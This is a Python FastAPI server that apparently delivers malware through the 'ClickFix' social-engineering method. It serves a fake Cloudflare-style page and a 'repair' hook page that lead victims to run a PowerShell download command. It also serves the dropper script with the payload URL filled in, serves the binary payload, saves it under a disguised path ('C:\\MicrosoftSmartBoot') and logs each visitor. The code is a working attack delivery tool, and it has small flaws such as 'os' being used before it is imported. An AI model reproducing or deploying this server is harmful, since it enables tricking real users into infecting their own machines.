from fastapi import FastAPI,Request
from fastapi.responses import FileResponse,HTMLResponse,Response
from do import DoShit
import asyncio
import aiofiles
import config
from fastapi.middleware.cors import CORSMiddleware




app = FastAPI()

app.add_middleware(CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)




@app.get(f"{config.dropperEndpoint}")
def malserve():
    with open(config.conf["PATHS"]["dropper"],"r",encoding="utf-8") as powershellscript:
        PSCode = powershellscript.read()
    PSCode = PSCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload"])
    return Response(
        content=PSCode,
        media_type="text/plain"
    )



@app.get(f"{config.binEndpoint}")
def serveBin():
    return FileResponse(
        config.conf["PATHS"]["binary_payload"]
    )







@app.get("/")
async def root_route(req:Request):
    await DoShit(req).start("now")

    async with aiofiles.open(config.conf["PATHS"]["cloudflare_page"],encoding="utf-8") as f:
        html = await f.read()
    html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
    html = html.replace('{{CLICK_FIX_PAGE}}',config.conf["URLS"]["clickfix_page_endpoint"])
    html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
    html = html.replace("{{Fav-Icon-URL-Placeholder}}",config.conf["URLS"]["favicon_url"])
    if os.environ.get("VERBOSE_DEBUG",None):print(html)
    return HTMLResponse(
      html  
    )

@app.get(f"{config.hookPageEndpoint}")
async def repair(req:Request):
    await DoShit(req).start("now")
    async with aiofiles.open(config.conf["PATHS"]["clickfix_page"],"r") as CFX:
        CFXHtml = await CFX.read()
    return Response(
        content=CFXHtml,
        media_type="text/plain"
    )



if __name__=="__main__":
    import os
    import colorama
    colorama.init()
    os.system(
        f"uvicorn {config.ServerFile.replace('.py','')}:app --port {config.DeployedPort} --host 0.0.0.0{"" if config.isDeployed else ' --reload'}"
    )